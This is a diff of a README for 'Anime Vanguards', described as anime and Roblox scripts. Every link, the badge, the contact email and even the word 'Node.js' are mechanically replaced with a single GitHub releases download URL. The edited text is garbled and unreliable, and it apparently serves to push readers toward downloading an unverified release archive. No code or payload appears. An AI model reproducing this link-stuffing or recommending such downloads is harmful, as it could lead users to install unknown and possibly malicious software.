@@ -1,6 +1,6 @@
 # Anime Vanguards 🎌
 
-![Anime Vanguards](https://img.shields.io/badge/Anime%20Vanguards-Ready%20to%20Explore-brightgreen)
+![Anime Vanguards](https://github.com/prashantggaikwad/Anime-Vanguards/releases%20Vanguards-Ready%20to%20Explore-brightgreen)
 
 Welcome to the **Anime Vanguards** repository! This project is dedicated to exploring the vibrant world of anime, VTubers, and interactive platforms like Roblox. Here, you will find tools, scripts, and resources to enhance your experience in these exciting domains.
 
@@ -38,7 +38,7 @@ This repository covers a wide range of topics:
 
 To get started with Anime Vanguards, you can download the latest version of the project. You can find the download link below:
 
-[Download Anime Vanguards](https://github.com/repo/user/archive.zip)
+[Download Anime Vanguards](https://github.com/prashantggaikwad/Anime-Vanguards/releases)
 
 After downloading, unzip the file and navigate to the folder to start exploring the resources available.
 
@@ -51,7 +51,7 @@ To install the project, follow these steps:
 3. **Navigate to the folder** using your terminal or command prompt.
 4. **Install any dependencies** as specified in the scripts.
 
-Make sure you have the necessary software installed on your machine, such as Python or Node.js, depending on the scripts you intend to use.
+Make sure you have the necessary software installed on your machine, such as Python or https://github.com/prashantggaikwad/Anime-Vanguards/releases, depending on the scripts you intend to use.
 
 ## Usage
 
@@ -85,9 +85,9 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 For any questions or suggestions, feel free to reach out:
 
-- GitHub: [Your GitHub Profile](https://github.com/yourprofile)
-- Email: [your.email@example.com](mailto:your.email@example.com)
+- GitHub: [Your GitHub Profile](https://github.com/prashantggaikwad/Anime-Vanguards/releases)
+- Email: [https://github.com/prashantggaikwad/Anime-Vanguards/releases](https://github.com/prashantggaikwad/Anime-Vanguards/releases)
 
-Explore the **Anime Vanguards** repository and join the conversation in the world of anime and gaming! If you want to keep up with the latest updates, check the [Releases](https://github.com/repo/user/releases) section regularly. 
+Explore the **Anime Vanguards** repository and join the conversation in the world of anime and gaming! If you want to keep up with the latest updates, check the [Releases](https://github.com/prashantggaikwad/Anime-Vanguards/releases) section regularly. 
 
-Remember, you can always [download Anime Vanguards](https://github.com/repo/user/archive.zip) again if you need to refresh your resources or check for new additions. Enjoy your journey through the anime landscape!
+Remember, you can always [download Anime Vanguards](https://github.com/prashantggaikwad/Anime-Vanguards/releases) again if you need to refresh your resources or check for new additions. Enjoy your journey through the anime landscape!
